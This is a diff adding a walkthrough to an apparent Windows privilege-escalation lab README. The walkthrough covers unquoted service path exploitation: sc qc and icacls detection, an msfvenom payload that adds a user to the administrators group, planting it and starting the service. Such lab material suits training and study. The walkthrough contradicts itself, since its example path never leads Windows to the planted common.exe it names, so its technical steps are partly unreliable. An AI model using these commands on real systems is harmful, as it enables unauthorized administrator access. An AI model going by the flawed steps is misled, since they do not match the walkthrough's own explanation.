@@ -1,5 +1,6 @@
 # Windows PrivEsc Arena
 
+
 <img width="1902" height="361" alt="image" src="https://github.com/user-attachments/assets/96706b9f-7faa-4ad5-8d3f-965cd8c67d44" />
 
 ---
@@ -923,6 +924,136 @@
 
 - <details>
       <summary>Unquoted Service Paths</summary>
+
+
+
+  
+  
+  
+  Windows Privilege Escalation: Unquoted Service Paths
+  ====================================================
+  
+  This guide demonstrates a privilege escalation technique by exploiting an **Unquoted Service Path**. This common misconfiguration occurs when the path to a service's executable is not enclosed in quotation marks and contains spaces.
+  
+  When this happens, Windows attempts to find the executable by treating each space as a delimiter. For a path like `C:\Program Files\Vulnerable Service\service.exe`, Windows will try to execute the following in order:
+  
+  1.  `C:\Program.exe`
+  
+  2.  `C:\Program Files\Vulnerable.exe`
+  
+  3.  `C:\Program Files\Vulnerable Service\service.exe`
+  
+  If an attacker can place a malicious executable in a writable directory higher up in this search order (e.g., creating `C:\Program Files\Vulnerable.exe`), they can trick the system into running their code with the service's high-level privileges.
+  
+  🕵️‍♂️ Detection
+  ----------------
+  
+  First, we need to find a service with an unquoted path and confirm we have write permissions in one of the parent directories.
+  
+  1.  Query the Service Configuration
+  
+      Open a command prompt on the Windows VM and use sc qc (Query Configuration) to inspect the unquotedsvc service.
+  
+      
+  
+      ```ruby
+      sc qc unquotedsvc
+  
+      ```
+  
+  2.  Identify the Unquoted Path
+  
+      In the output, look at the BINARY_PATH_NAME.
+  
+      > Notice that the path is not enclosed in quotes and contains spaces, for example: `C:\Program Files\Unquoted Path Service\unquotedpathservice.exe`. This confirms the vulnerability.
+  
+  3.  Check Directory Permissions
+  
+      Now, check if you have permission to write a file into one of the directories in the path. We will check C:\Program Files\Unquoted Path Service.
+  
+      
+  
+      ```ruby
+      icacls "C:\Program Files\Unquoted Path Service"
+  
+      ```
+  
+      If the output shows that your user or a group you belong to (like `BUILTIN\Users`) has write permissions (`(W)`, `(M)`, or `(F)`), you can proceed with the exploit.
+  
+  💥 Exploitation
+  ---------------
+  
+  The exploitation involves creating a malicious service executable, placing it in the vulnerable directory, and starting the service.
+  
+  ### 1\. Preparing the Payload (Kali VM)
+  
+  1.  Generate the Malicious Executable
+  
+      On your Kali machine, use msfvenom to create a payload. The output filename must match the part of the service path you are targeting. For C:\Program Files\Unquoted Path Service\unquotedpathservice.exe, the vulnerable file is common.exe placed inside the parent folder. We will use the -f exe-service format, which is suitable for Windows services.
+  
+      Bash
+  
+      ```ruby
+      msfvenom -p windows/exec CMD='net localgroup administrators user /add' -f exe-service -o common.exe
+  
+      ```
+  
+  2.  Transfer the Payload
+  
+      Copy the newly generated common.exe file from your Kali VM to the Windows VM.
+  
+  ### 2\. Planting and Triggering the Exploit (Windows VM)
+  
+  1.  Place the Payload in the Vulnerable Path
+  
+      On the Windows VM, move your common.exe payload into the writable directory identified during detection.
+  
+      
+  
+      ```ruby
+      move C:\Path\to\common.exe "C:\Program Files\Unquoted Path Service\"
+  
+      ```
+  
+  2.  Start the Service to Trigger the Exploit
+  
+      Now, start the service. When the Service Control Manager tries to launch the service, Windows will find and execute your malicious common.exe before it looks for the legitimate unquotedpathservice.exe.
+  
+      
+  
+      ```ruby
+      sc start unquotedsvc
+  
+      ```
+  
+      The service may fail to start correctly, but our embedded command will have already executed with `SYSTEM` privileges.
+  
+  ✅ Verification
+  --------------
+  
+  To confirm that the privilege escalation was successful, check the membership of the local administrators group.
+  
+  1.  Check Administrators Group
+  
+      In the command prompt, type:
+  
+      
+  
+      ```ruby
+      net localgroup administrators
+  
+      ```
+  
+      You will now see the `user` account listed as a member of the group, confirming a successful privilege escalation.
+  
+  
+
+
+
+
+
+
+
   </details>
   
   
